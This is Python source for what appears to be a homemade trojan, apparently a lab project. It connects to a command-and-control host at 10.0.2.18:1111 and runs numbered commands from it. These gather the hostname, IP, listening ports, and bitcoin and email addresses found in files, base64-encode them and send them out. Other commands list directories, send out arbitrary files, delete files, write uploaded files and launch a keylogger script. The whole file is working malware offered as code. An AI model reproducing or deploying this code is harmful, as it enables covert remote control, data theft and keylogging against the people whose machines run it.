import socket
import subprocess
import os
import shutil
import base64
import json
import re

REMOTE_HOST = "10.0.2.18"
REMOTE_PORT = 1111

s = socket.socket()
s.connect((REMOTE_HOST, REMOTE_PORT))

while True:
    command = s.recv(1024)
    command = command.decode()
    print("\nCommand received\n")
    if command == "1":
        print("start scan\n")
        # get hostname of the machine
        hostname = socket.gethostname()
        print("got hostname" , hostname)

        #get IP of the machine
        try:
            IP = s.getsockname()[0]
        except Exception:
            IP = '127.0.0.1'

        # search for bitcoin and email addresses
        bitcoin_addresses_list = []
        email_addresses_list = []
        for root, subdirs, files in os.walk("/home/matt/Documents/python-trojan/test-data"):
            for file in files:
                file_fd = open("{}/{}".format(root, file), "r")
                print(root, file)
                try:
                    # read the contents of each file
                    file_contents = file_fd.read().strip()
                    # search for bitcoin addresses
                    bitcoin_addresses = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})", file_contents)                
                    # search for email addresses
                    email_addresses = re.findall(r"[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)
     
                    # check if we have found any bitcoin addresses or emails
                    if len(bitcoin_addresses) > 0:
                        bitcoin_addresses_list = bitcoin_addresses_list + bitcoin_addresses
                    if len(email_addresses) > 0:
                        email_addresses_list = email_addresses_list + email_addresses

                    file_fd.close()
                except:
                    pass

        # get all open ports on the machine
        open_ports = os.popen("netstat -plant | grep -i listen | awk '{print $4}' | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}'").read()
        open_ports = open_ports.strip().split("\n")


        # encode data to json and send them to command and control server
        data = {
            "machine_hostname": hostname,
            "machine_ip": IP,
            "machine_open_ports": open_ports,
            "bitcoin_addresses_found": bitcoin_addresses_list,
            "email_addresses_found":email_addresses_list
        }
        # base64 encode the json data
        encoded_data = base64.b64encode(json.dumps(data).encode())
        # # # send data to command and control server
        s.send(encoded_data)
        print("\nCommand has been executed successfully.. \n")
    elif(command == "2"):
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("\nCommand has been executed successfully..\n")
    elif command == "3":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("\nCommand has been executed successfully.. \n")
    elif command == '4':
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("\nFile has been send successfully\n")
    elif command == "5":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("\nCommand has been executed successfully\n")
    # elif command == "remove_dir":
    #     directory = s.recv(6000)
    #     directory = directory.decode()
    #     #print(directory)
    #     os.rmdir(directory)
        print("\nCommand has been executed successfully\n")
    elif command == "6":
        filename = s.recv(6000)
        new_file = open(filename,  "wb")
        data = s.recv(6000)
        new_file.write(data)
        new_file.close()
    elif command == "7":
        exec(open('keylogger.py').read())
    else:
        print("Command not recognized")